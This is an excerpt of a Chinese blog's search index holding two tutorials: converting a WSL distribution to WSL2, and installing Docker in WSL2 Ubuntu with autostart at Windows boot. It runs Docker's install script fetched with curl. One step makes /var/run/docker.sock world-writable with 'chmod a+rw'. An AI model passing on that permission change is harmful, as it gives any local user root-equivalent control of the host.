<h3 id="查看当前子系统名称及版本"><a href="#查看当前子系统名称及版本" class="headerlink" title="查看当前子系统名称及版本"></a>查看当前子系统名称及版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl -l -v</span><br></pre></td></tr></table></figure>
<h3 id="转换指定发行版到wsl2"><a href="#转换指定发行版到wsl2" class="headerlink" title="转换指定发行版到wsl2"></a>转换指定发行版到wsl2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --set-version Ubuntu 2</span><br></pre></td></tr></table></figure>
<p>等待转换完成后，再次执行<code>wsl -l -v</code>查看是否转换成功<br>如果要恢复的话，执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --set-version Ubuntu 1</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/WPwalter/article/details/101508601">如何在 Windows 10 中安装 WSL2 的 Linux 子系统</a><br><a href="https://blog.csdn.net/littlehaes/article/details/104879476">WSL 2 需要更新其内核组件</a></p>
]]></content>
      <tags>
        <tag>WSL</tag>
      </tags>
  </entry>
  <entry>
    <title>在WSL2(Ubuntu 18.04)中安装docker并配置自启动</title>
    <url>/2020/04/15/wsl2-docker/</url>
    <content><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">sudo sh get-docker.sh</span><br></pre></td></tr></table></figure>
<h3 id="启动docker并配置权限"><a href="#启动docker并配置权限" class="headerlink" title="启动docker并配置权限"></a>启动docker并配置权限</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo service docker start</span><br><span class="line">sudo usermod -aG docker $USER</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h3 id="添加当前用户进docker组"><a href="#添加当前用户进docker组" class="headerlink" title="添加当前用户进docker组"></a>添加当前用户进docker组</h3><ol>
<li>查看是否创建docker组<br><code>cat /etc/group | grep docker</code></li>
<li>创建docker组<br><code>sudo groupadd docker</code></li>
<li>将用户添加到docker分组<br><code>sudo usermod -aG docker 用户名</code></li>
<li>查看是否生效<br><code>cat /etc/group | grep docker</code></li>
<li>重启docker<br><code>sudo systemctl restart docker</code></li>
<li>给docker.sock添加权限<br><code>sudo chmod a+rw /var/run/docker.sock</code></li>
</ol>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>重新登录wsl<br>执行以下命令进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>

<h3 id="配置自启动"><a href="#配置自启动" class="headerlink" title="配置自启动"></a>配置自启动</h3><h4 id="wsl脚本"><a href="#wsl脚本" class="headerlink" title="wsl脚本"></a>wsl脚本</h4><p>将以下内容添加至<code>/etc/init.wsl</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>
<p>设置可执行权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chmod +x /etc/init.wsl</span><br></pre></td></tr></table></figure>
<h4 id="Windows开机自启"><a href="#Windows开机自启" class="headerlink" title="Windows开机自启"></a>Windows开机自启</h4><p>win+r，<code>shell:startup</code>，在该目录下创建vbs脚本<br><code>linux-start.vbs</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set ws = WScript.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">ws.run &quot;wsl -d ubuntu -u root /etc/init.wsl&quot;</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/74489613">WSL 2中安装Docker</a><br><a href="https://www.cnblogs.com/blog5277/p/12071400.html">WSL2（Ubuntu）安装Docker</a><br><a href="https://www.xu.ci/2019/12/windowswsl2ubuntu.html">Windows开机启动WSL2（Ubuntu）的启动项</a><br><a href="https://www.cnblogs.com/zyh1994/p/13688542.html">解决运行docker命令要用sudo的问题</a></p>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>Docker</tag>
        <tag>WSL</tag>
      </tags>
  </entry>
</search>
